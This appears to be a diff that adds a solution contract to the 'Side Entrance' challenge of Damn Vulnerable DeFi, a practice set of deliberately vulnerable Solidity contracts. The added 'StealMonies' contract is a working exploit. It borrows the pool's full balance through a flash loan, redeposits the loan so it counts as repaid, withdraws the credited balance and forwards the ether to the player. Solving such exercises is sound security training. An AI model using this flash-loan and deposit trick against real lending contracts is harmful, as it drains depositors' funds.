@@ -8,6 +8,33 @@ interface IFlashLoanEtherReceiver {
     function execute() external payable;
 }
 
+
+contract StealMonies is IFlashLoanEtherReceiver {
+    SideEntranceLenderPool pool;
+    address player;
+
+    constructor(SideEntranceLenderPool _pool) {
+        pool = _pool;
+        player = msg.sender;
+    }
+
+    function flashLoan() external {
+        pool.flashLoan(address(pool).balance);
+    }
+
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
+    }
+
+    function withdraw() external {
+        pool.withdraw();
+    }
+
+    receive() external payable {
+        player.call{value: msg.value}("");
+    }
+}
+
 /**
  * @title SideEntranceLenderPool
  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
